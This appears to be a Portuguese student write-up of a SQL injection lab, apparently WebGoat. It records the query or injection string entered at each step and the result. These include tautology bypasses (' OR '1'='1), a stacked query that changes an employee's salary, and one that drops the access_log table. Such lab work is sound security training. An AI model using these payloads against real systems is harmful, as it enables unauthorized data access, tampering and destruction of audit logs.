## Exercício 1

### Pergunta 1.1

SQL Injection - Passos efetuados na resolução:

#### Passo 2
```select department from employees where userid=96134```

Resultado: Department markting
#### Passo 3
```update employees set department='Sales' where first_name='Tobi'```

Resultado: 89762 Tobi Barnett Sales 77000 TA9LL
#### Passo 4
```alter table employees add phone varchar(20); ```

Resultado: ALTER TABLEemployees ADD phone varchar(20)
#### Passo 5
```GRANT ALTER TABLE TO 'UnauthorizedUser'```

Resultado: GRANT ALTER TABLE TO UnauthorizedUser
#### Passo 9
```SELECT * FROM user_data WHERE first_name = 'John' and last_name = '' or '1' = '1'```

Resultado: Toda a user_data porque '1' = '1' é sempre verdadeiro.
#### Passo 10
``` SELECT * From user_data WHERE Login_Count = 1 and userid= 1 or 1=1 ```

Resultado: Toda a user_data porque '1' = '1' é sempre verdadeiro.
#### Passo 11
No campo *Authentication TAN*: ``` ' OR '1' = '1```

Resultado: "You have succeeded!You have successfully compromised the confidentiality of data by viewing internal information that you should not have access to. Well done!"
#### Passo 12
``` '; update employees set salary = 120000 where auth_tan = '3SL99A ```

Resultado: Com os primeiros caractéres terminamos a *query*. Depois encadeamos uma outra que altera o valor do salário.
#### Passo 13
``` ';drop table access_log; select * from access_log where action =' ```

Resultado: Fazemos novamente o processo de encadear a query que queremos, neste caso que apaga a tabela com os *logs*. De seguida junta-se uma outra *query* que termina com a plica (') de forma a não haver erros. Como resultado final, a tabela é apagada.
